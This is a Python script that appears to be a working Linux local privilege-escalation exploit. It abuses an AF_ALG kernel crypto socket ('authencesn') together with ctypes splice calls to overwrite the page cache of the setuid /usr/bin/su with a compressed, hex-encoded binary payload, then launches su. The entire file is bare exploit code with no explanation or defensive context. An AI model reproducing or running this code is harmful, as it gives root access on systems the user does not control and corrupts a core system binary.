import os
import zlib
import socket

# ======================= 修复版 splice 替换 =======================
import ctypes
from ctypes import c_int, c_void_p, c_size_t, c_longlong, c_ssize_t, c_uint

libc = ctypes.CDLL("libc.so.6", use_errno=True)

splice = libc.splice
splice.argtypes = [
    c_int,
    c_void_p,
    c_int,
    c_void_p,
    c_size_t,
    c_uint
]
splice.restype = c_ssize_t

def os_splice(fd_in, fd_out, length, offset_src=None, offset_out=None, flags=0):
    off_in = ctypes.byref(c_longlong(offset_src)) if offset_src is not None else None
    off_out = ctypes.byref(c_longlong(offset_out)) if offset_out is not None else None
    return splice(fd_in, off_in, fd_out, off_out, length, flags)

os.splice = os_splice
# ==================================================================

def d(x):
    return bytes.fromhex(x)

def c(f, t, c):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg(
        [b"A" * 4 + c],
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
        32768
    )
    r, w = os.pipe()
    os_splice(f, w, o, offset_src=0)
    os_splice(r, u.fileno(), o)
    try:
        u.recv(8 + t)
    except:
        pass

f = os.open("/usr/bin/su", 0)
i = 0
e = zlib.decompress(d("789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca83d10c023046c3250fa1864b40fd578086083002f94c40bc421a2a06627343d8fa499979fac5190c00436c1587"))

while i < len(e):
    c(f, i, e[i:i+4])
    i += 4

os.system("su")